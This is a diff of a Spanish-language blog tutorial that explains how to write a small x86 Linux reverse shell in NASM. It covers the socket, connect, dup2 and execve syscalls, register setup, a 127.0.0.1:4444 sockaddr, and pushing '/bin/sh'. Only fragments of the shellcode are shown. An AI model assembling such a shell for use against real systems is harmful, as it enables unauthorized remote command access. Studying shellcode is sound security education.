@@ -70,7 +70,7 @@
 
 <p>Veamos unos conceptos básicos, está explicación es realizado en nasm, esta forma no es única, hay varias formas, todo depende de tu imaginación y de como te atrevas a programarlo.</p>
 
-<p>Explicaré una formas básicas de una shell pequeña, lo demás es bajo tu creatividad y responsabilidad.</p>
+<p>Explicaré una forma básicas de una shell pequeña, lo demás es bajo tu creatividad y responsabilidad.</p>
 
 <p>Algo que debes tener en cuenta para poder realizarlo, es saber manejar registros en ASM y sus ejecuciones, dejo un link a una página donde puedes aprender más.</p>
 
@@ -181,23 +181,23 @@ Conceptos básicos.
  <p>Para compilar: nasm -felf32 .nasm<br>
 ld -m elf_i386 .o -o</p>
 
-<p>Primero que todo tenemos que avisarle al sistema que vamos a usar socket, así que hay que hace un call para poder iniciar.</p>
-<p>Antes que nada, es bueno que busques esta información en el codigo fuente de linux, por lo general se encuentran en:</p>
+<p>Primero que todo tenemos que avisarle al sistema que vamos a usar un socket, así que hay que hace un invocación para poder iniciar.</p>
+<p>Antes que nada, es bueno que busques esta información en el código fuente de linux, por lo general se encuentran en:</p>
 <p><b>/usr/include/asm/unistd_32.h</p>
-<p>/usr/include/linux/net.h</p>
+<p>/usr/include/linux/net.h</b></p>
 <p>Vamos a necesitar varios.</p>
-<p>#define __NR_socketcall 102</p>
+<p><b>#define __NR_socketcall 102</p>
 <p>#define SYS_CONNECT  3 </p>
 <p>#define __NR_dup2 63</p>
 <p>#define __NR_execve 11</p>
 <p>#define SYS_SOCKET  1</p></b>
-<p>Los syscall en linux son int 0x8</p>
+<p>Los syscall en linux son int 0x8</b></p>
 
-<p>Así que debemos poner <b>mov al, 102</b> </p>
+<p>Así que debemos poner <b>mov al, 102 </b>, ¿porqué?, porque los call buscan a eax para saber que van a realizar y los parametros se encuentran en los siguientes registros (ebx, ecx, edx, etc) .</p>
+
+<p>En seguida debemos usar esta funcion basandonos en los siguientes parametro.</p>
 
 <pre class="brush: cpp; title: ; notranslate" title=""><b>int socket(int domain, int type, int protocol)</b></pre>
-
-<p>En seguida debemos usar esa funcion.</p>
 
 Tipo de datos<br>
     <table style="font-family: &quot;Times New Roman&quot;;
@@ -224,9 +224,15 @@ Tipo de datos<br>
         </tr>
     </table><br>
 
-<p>Con eso podemos entender que necesitamos, solo hay que meter en cada registro el dato necesario.</p>
+<p>Con eso podemos saber que es lo que necesitamos, solo hay que meter en cada registro el dato necesario.</p>
 
-<p>Pero antes debemos saber como meter todo esos datos. La mejor opción es meter todo a la pila, para eso sirven los push.</p>
+<p>Pero antes debemos saber como meter todos esos datos. La mejor opción es meter todo a la pila, para eso sirven los push.</p>
+
+<p><b>xor</b>, hace una comparación tipo <b>not</b>, por ejemplo, si fuera eax=1, con xor podemos decir: eax=1 not eax=1; resultado = 0 </p>
+
+<p><b>inc</b>, incrementa +1 un registro, por ejemplo, si fuera eax=1, entonces, <b>inc eax</b>, sería ahora eax = 2</p>
+
+<p><b>pop</b>, saca de la pila el ultimo registro guardado, por ejemplo, push 0x1; push 0x2; entonces, <b>pop eax</b>, sería ahora eax = 2, <b>pop eax</b>, entonces ahora eax = 1</p>
 
 <p><b>xor esi, esi<br>
   inc esi = 1<br>
@@ -264,7 +270,7 @@ int 0x80<br><br></b>
 
 <pre class="brush: cpp; title: ; notranslate" title=""><b>int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</b></pre>
 
-<p>La respuesta del sistema siempre se guarda en <b>eax</b>, así que solo habrá que hacer un cambio con <b>xchg</b>, así que pare no complicarnos la vida lo hacemos directamente con el registro que lo va a usar, <b>edx</b>.</p>
+<p>La respuesta del sistema siempre se guarda en <b>eax</b>, así que solo habrá que hacer un cambio con <b>xchg</b>, para no complicarnos la vida lo hacemos directamente con el registro que lo usará posteriormente, <b>edx</b>.</p>
 
 <p><b>xchg edx, eax</b></p>
 
@@ -275,27 +281,29 @@ int 0x80<br><br></b>
 ;  struct in_addr        sin_addr;       /* Internet address             */
 ;};</b></pre>
 
-<p>Veamos como quedaría-</p>
+<p>Veamos como quedaría.</p>
 
 <p><b>
 push 0x0100007f = 127.0.0.1<br>
 push word 0x5c11 = 4444<br>
 push word 0x2 = AF_INET</b><br><br>
 
-volvemos a repetir<br><br>
+Guardamos eso en el registro que se va a usar posteriormente y volvemos a repetir.<br><br>
 
-<b>mov ecx, esp = sockaddr_in<br>
-push 0x10 (size of struct)<br>
-push ecx <br>
+<b>mov ecx, esp = sockaddr_in<br><br>
+push 0x10 = (size of struct)<br>
+push ecx = sockaddr_in <br>
 push edx = socket</b><br><br>
 
-una vez más, pero ya para definir connect<br><br>
+Una vez más, pero ya para definir a connect.<br><br>
 
 <b>eax, 102 = syscall<br>
 mov bl, 0x3 = connect<br>
 mov ecx, esp = toda la estructira de arriba</b><br><br>
 
 <p>Ya tenemos lista la conexión, pero falta como crear una tubería para mandar y recibir datos. Para eso usaremos <b>dup2(2)</b>.</p>
+
+<pre class="brush: cpp; title: ; notranslate" title=""><b>int dup2(int oldfd, int newfd);</b></pre>
 
 <p><b>stdin(0)<br>
 stdout(1)<br>
@@ -305,9 +313,9 @@ stderr(2)</b><br></p>
 
 <p>Veamos que se debe hacer.</p>
 
-<p>Tiene que invocar a dup2 en <b>eax</b>, <b>ecx</b> se usa para loops o ciclos de repetición</p>
+<p>Tienes que invocar a dup2 en <b>eax</b>, <b>ecx</b> se usa para loops o ciclos de repetición y <b>edx</b> tiene el socket.</p>
 
-<p>Para hacer ciclos de repetición, tienes que hacer uso de jumps (jne, jz)</p>
+<p>Para hacer ciclos de repetición, tienes que hacer uso de <b>jumps (jne, jz)</b></p>
 
 <p>Por ejemplo:</p>
 <p><b>mov ecx, 0x3<br>
@@ -319,14 +327,14 @@ jnz salto</b><br></p>
 
 <p>Si ya entendieron el concepto, esto es muy sencillo.</p>
 
-<p>Ahora hay que repetir la formula de arriba para pushear <b>bash</b>.</p>
+<p>Ahora hay que repetir la formula de arriba para usar <b>/bin/bash</b>.</p>
 
-<p><b>/bin/sh0.. </b>Es muy importante el null al final, para que el sistema entienda que ahpi termina la cadena de caracteres y se detenga
+<p>En realidad es <b>"/bin/sh0"... </b>es muy importante el null al final, para que el sistema entienda que ahí termina la cadena de caracteres y se detenga.
 </p><br>
 
 <p><b>Recuerda que se debe poner al reves por el sistema "Endianness"</b>
-</p><br>
-<p>Te coloco un link con la explicación detallada de que eso.</p>
+</p>
+<p>Te coloco un link con la explicación detallada sobre eso.</p>
 <a href="https://es.wikipedia.org/wiki/Endianness">Endiannes</a>
 
 <p>"hs//nib/" <--- Encuentra los hexadecimales.</p>
@@ -338,16 +346,15 @@ jnz salto</b><br></p>
 <pre class="brush: cpp; title: ; notranslate" title=""><b>int execve(const char *filename, char *const argv[],char *const envp[]);</b></pre>
 
 <p><b>eax = execv<br>
-  ebx = filename<br>
+  ebx = filename,0<br>
 ecx = argv <-- 0<br>
 edx = envp <-- 0</b><br><br></p>
 
 
 <p>Listo.</p>
 
-<p>Si deseas el código completo puede apoyarme en patreon, ahí encontraras el código y más.</p>
-<p>En github se encuentra parte del código como referencia.</p>
-
+<p>Si deseas el código completo puede apoyarme en patreon, ahí encontraras el código y más. <a href="https://www.patreon.com/BGPavelAng">Patreon</a></p>
+<p>En github se encuentra parte del código como referencia. <a href="https://github.com/BGPavelAng">Github</a></p>
       </div>
 
     </div>
